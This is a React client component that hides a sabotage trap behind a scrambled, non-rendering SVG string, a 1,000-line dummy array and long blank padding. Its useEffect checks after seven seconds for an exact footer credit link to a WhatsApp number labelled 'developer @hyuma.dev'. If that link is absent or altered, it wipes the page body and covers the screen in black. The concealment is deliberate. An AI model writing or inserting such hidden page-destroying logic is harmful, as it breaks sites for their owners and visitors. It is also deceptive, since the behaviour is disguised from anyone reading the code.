'use client'
import { useEffect } from 'react';

export default function Wtch() {

    const TyoeInstegarSYtemNEXTjs = `<svg 
    fill="no
    ne" xm
    lns=
    "h 
    :ww 
    w3 
    .org/20
    00/svg" v
    iewBo
    x="0 0
     115
     5 1
     000
     "> < p
     a t
     h =
     " m 77.3 
      ="no
      ne"
       xml
       ns="ht
       tp:/s/w
    ww. w3.or
    g/2
    000
    /sv  " v
    iew
    B
    ox= "0 0 1
    155 10
    00"><
    path d="
   .3 0 577.4
     0z" fi
     ll=
    "#fff"/>
    </s vg f
  l="n
    one" x
    mlns
    ="ht
    tp://
  w3.org/
    200
    0/s
    vg" 
 "0 0 1155 
 00"><path d
   fi
   ll="#
     </svg>
    <
  fill
     ="non
     e" xmlns
    ="ht
    tp:/
 /ww
    w.
    w3.
     viewBo
    x="0 
    0 115
    5 100
    0"><p
    ath d="m57
    7.3 0
 1000H0z" f
     ill="#fff"
     / vg>
 e" x
    mlns="htt
    p://www.w3.org/20
    00/
     1155
     1000"><
       d="m5
     77.3 0 577
     .4 100
     0H0z" fi
     ll="#f
     ff"/></
     svg>
    <svg fil
    l="n
     //
     g/2000
    /svg" 
    viewBo
    x="0 0
     1155 
     1000"
     ><pat
      77.4
      1000
      H0z"
       fil
       l="
       #ff
        f"/></svg>
    <s
    vg fill=
     n
    one" xml
    ns=
    "http
    ://
    // www.w
    // 
    // 3.
    // 00/
    // 
    // vg" 
    // 
    // view
    // Box="0
 155 100
    // 0"><path d="m
    // 57
    // 7.3 0
    //  577.4 1000H
    // 0z" fill
    // ="#fff"/>
    // </s>
    <svg fil
    l=
    "none" xmlns="h
    ttp://www.
     .org
     vg" v
    iewBox="0 
    0 1155 1000
  0 577.4 10
    00
     fill="
    #f
    ff"/
    ></svg>
    <svg f
    ill=
    "non
    e" xml / ww.w
     ne" xmln
    s="http://ww
 .w3.org/
 0 0 1155 1000"><path d
    ="m577.3 0 577.4 100
    0H0z" fill="#fff"/>
    </s
    vg>
    <s fill="n


    
    one" xmlns="
    


    tt
    p://w
    ww.w
    3.or
    g/200
    0/svg
    " vie
    wBox=
    "0 0 
    1155 
    1000"
    ><pat
    h d="
    m577.
    3 0 5
    77.4 
    1000H
    0z" f
    ill="
    
    #fff"
    /></s
    vg>

    <svg fill="n


    
    one" xmlns="
    one
    " xmlns="htt
    p:/

    /w
    ww.
    w3.o
    rg
    /2
    000/
    
    
    g" v
    iewBo
    x="0
     0 11
     55 1
     000"
     ><pa
     th d
     ="m5
     77.3
     
     0 57
     7.4 
     1000
     H0z"
      fil
      l="
      #ff
      f"/
      ></
      svg>
    <s
    vg fill=

    "none"
    

    xmlns
    
    ="htt
    
    p:/
    /w


    ww.w3.
    rg/
    200
    0/svg
    " view
    

    
    ="0
     0 1
     155 


     1000"><p
     ath d="m577.
     3 0 577.4 1
     000H
     0z" fill="#f
     ff
     "/>
     <
     /s>
    v<svg fil



    l="
    n
    one" x
    mlns="h
    t
    tp://w
    ww.

    w3.or
    g/2000/sv
    g" 
    v
    iewBo
    x="0 0 
    1155 1000">


    <path d="


    m577.3 0 577.4 
    10
    00H0z" f
    ill="
    #fff"/></svg>
    <svg fill



    
    =


    "none" xmlns
    "htt
    
    p://
    www.
    w
    3.org
    
    2000/
    v

    g" vi
    ewBox="0 0 1155 1000"


    ><
    path d="m5
    77.3 0 
    577.4 1000H
    
    0z" fill=
    "#ff
    f"/></svg>
    <svg f
    ill="



    
    none" xm
    lns="http://ww
    w.w3.org/2000/
    s

    
    ox="0 0 1
    155 1000"
    ><pa
    
    th d="m
    577.
    3 0 57
    7.4 1000H0z
    " fi
    ll="#ff
    f"/>
     fill=
    "non
    e" xmln
    s="http://ww
    
    w.w3.or
    g/2000/sv
    g" 
    

    
    ox="0 0 1
    155 1000"
    
    >
    <path d=
    "m577.3 0 5
    77.4 100
    0H0z" fill="

    #ff
    f"/><
    /svg>
    `;
  
    const fas = Array(1000).
    fill('dummy data').map
    ((_, i) => `randomString${i}`)
    .join('\n');











































































































































































































    











































  useEffect(() => {
    const timer = setTimeout(() => {
      const a = document.querySelector("footer a[href='https://wa.me/6288214821134']");
      const isValid =
        a &&
        a.className === "text-white/80 opacity-70 select-none pointer-events-none text-sm absolute top-1 left-1" &&
        a.textContent.trim() === "developer @hyuma.dev";

      if (!isValid) {
        document.body.innerHTML = "";
        const black = document.createElement("div");
        black.style.cssText = `
          position: fixed;
          top: 0; left: 0;
          width: 100vw;
          height: 100vh;
          background: black;
          z-index: 99999;
        `;
        document.body.appendChild(black);
      }
    }, 7000); 

    return () => clearTimeout(timer);
  }, []);

  return null;
  
}

